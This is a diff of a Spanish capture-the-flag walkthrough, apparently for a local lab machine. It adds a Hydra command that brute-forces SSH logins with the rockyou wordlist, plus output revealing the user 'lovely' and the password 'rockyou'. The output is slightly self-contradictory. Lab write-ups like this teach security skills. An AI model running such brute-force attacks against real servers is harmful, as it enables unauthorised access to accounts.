@@ -162,12 +162,26 @@ msf auxiliary(scanner/ssh/ssh_enumusers) > run
 [+] Auxiliary module execution completed
 ```
 Una vez acabada la ejecución podemos observar el posible usuario de sistema, *lovely*.  Para comprobar si estamos en lo cierto, haremos uso de la herramienta de fuerza bruta [Hydra](https://github.com/vanhauser-thc/thc-hydra) utilizando *lovely* como nombre de usuario y el diccionario [rockyou](https://github.com/topics/rockyou-wordlist\) para comprobar contraseñas.
+```ruby
+❯ hydra -l lovely -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 16:48:53
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: lovely   password: rockyou
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 16:49:05
+```
 * Con -l seleccionamos el usuario.
 * Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
 * Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.
-Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *mario*.
+Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *lovely*.
 Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
-Una vez acabada la ejecución podemos observar el posible usuario de sistema, *lovely*.  Para comprobar si estamos en lo cierto, haremos uso de la herramienta de fuerza bruta [Hydra](https://github.com/vanhauser-thc/thc-hydra) utilizando *lovely* como nombre de usuario y el diccionario [rockyou.txt](https://github.com/topics/rockyou-wordlist) para comprobar contraseñas.
 
 
